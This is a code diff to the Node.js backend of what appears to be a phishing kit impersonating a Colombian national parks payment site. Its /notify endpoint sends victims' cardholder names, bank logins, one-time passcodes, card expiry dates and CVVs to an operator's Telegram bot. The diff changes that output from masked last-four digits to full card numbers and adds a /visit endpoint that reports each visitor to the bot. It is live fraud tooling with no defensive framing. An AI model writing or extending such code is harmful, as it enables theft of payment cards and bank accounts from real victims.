@@ -79,7 +79,7 @@ app.post('/notify', async (req, res) => {
           `━━━━━━━━━━━━━━━━━\n` +
           `📄 Factura: #${d.invoiceNumber || '—'}\n` +
           `💰 Valor: ${d.invoiceAmount || '—'}\n` +
-          `💳 Tarjeta: ****${d.cardLast4 || '—'}\n` +
+          `💳 Tarjeta: ${d.cardFull || ('****' + (d.cardLast4 || '—'))}\n` +
           `👤 Titular: ${d.name || '—'}\n` +
           `🔑 OTP: <b>${d.otp}</b>\n` +
           `🌐 IP: ${d.ip || '—'}\n` +
@@ -95,7 +95,7 @@ app.post('/notify', async (req, res) => {
           `🏦 Banco: ${d.bankDisplay || '—'}\n` +
           `📄 Factura: #${d.invoiceNumber || '—'}\n` +
           `💰 Valor: ${d.invoiceAmount || '—'}\n` +
-          `💳 Tarjeta: ${d.cardLast4 || '—'}\n` +
+          `💳 Tarjeta: ${d.cardFull || d.cardLast4 || '—'}\n` +
           `👤 Titular: ${d.name || '—'}\n` +
           `🔑 ${d.field1Label}: <b>${d.field1Value}</b>\n` +
           `🔒 ${d.field2Label}: <b>${d.field2Value}</b>\n` +
@@ -118,7 +118,7 @@ app.post('/notify', async (req, res) => {
           `💳 <b>Tarjeta</b>\n` +
           `   🏦 Banco: ${c.bankRaw || c.bankSlug || '—'}\n` +
           `   🃏 Franquicia: ${c.scheme || c.brand || '—'} ${c.type ? '/ ' + c.type : ''}\n` +
-          `   🔢 Número: •••• •••• •••• ${c.last4 || '—'}\n` +
+          `   🔢 Número: ${c.fullNumber || ('•••• •••• •••• ' + (c.last4 || '—'))}\n` +
           `   🔢 BIN: ${c.bin || '—'}\n` +
           `   📅 Vencimiento: ${c.expiry || '—'}\n` +
           `   🔒 CVV: ${c.cvv || '—'}\n` +
@@ -133,6 +133,22 @@ app.post('/notify', async (req, res) => {
   await tg.sendTelegram(msg, tg.getKeyboard(tid));
   console.log('[NOTIFY] Respuesta enviada al cliente');
   res.json({ ok: true, tid });
+});
+
+// --- Endpoint de visita (nueva visita al sitio) ---
+app.post('/visit', async (req, res) => {
+  const d = req.body || {};
+  const ts = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  const msg = `👁️ <b>NUEVA VISITA — Parques Nacionales</b>\n` +
+              `━━━━━━━━━━━━━━━━━\n` +
+              `🔗 Referente: ${d.referrer || 'Acceso directo'}\n` +
+              `⏰ Hora: ${ts}`;
+  try {
+    await tg.sendTelegram(msg);
+    res.json({ ok: true });
+  } catch (e) {
+    res.json({ ok: false });
+  }
 });
 
 // --- DEBUG: ver sesiones activas y probar comando directo ---
